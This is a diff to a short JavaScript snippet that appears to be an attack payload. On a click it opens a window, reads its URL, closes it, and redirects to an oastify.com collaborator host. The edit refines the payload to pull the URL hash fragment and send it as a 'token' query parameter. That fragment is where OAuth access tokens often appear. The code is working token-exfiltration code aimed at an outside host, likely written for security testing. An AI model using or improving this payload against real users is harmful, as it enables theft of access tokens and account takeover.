@@ -8,9 +8,22 @@ document.body.addEventListener('click', function () {
     
     setTimeout(() => {
         if (newWindow) {
-            const newWindowLocation = newWindow.location.href;
-            newWindow.close();
-            location = `https://839xk91bqq1do1b501vxm3pal1rsfj38.oastify.com/?token=${newWindowLocation}`
+            try {
+                const newWindowLocation = newWindow.location.href;
+                newWindow.close();
+                
+                // Extract hash from the URL
+                const hashIndex = newWindowLocation.indexOf('#');
+                let queryParams = '';
+                if (hashIndex !== -1) {
+                    const hash = newWindowLocation.substring(hashIndex + 1);
+                    queryParams = new URLSearchParams({ token: hash }).toString();
+                }
+                
+                location = `https://839xk91bqq1do1b501vxm3pal1rsfj38.oastify.com/?${queryParams}`;
+            } catch (e) {
+                console.log('Unable to access new window location. Possible cross-origin restriction.');
+            }
         } else {
             console.log('Failed to open a new window. Please check pop-up blocker settings.');
         }
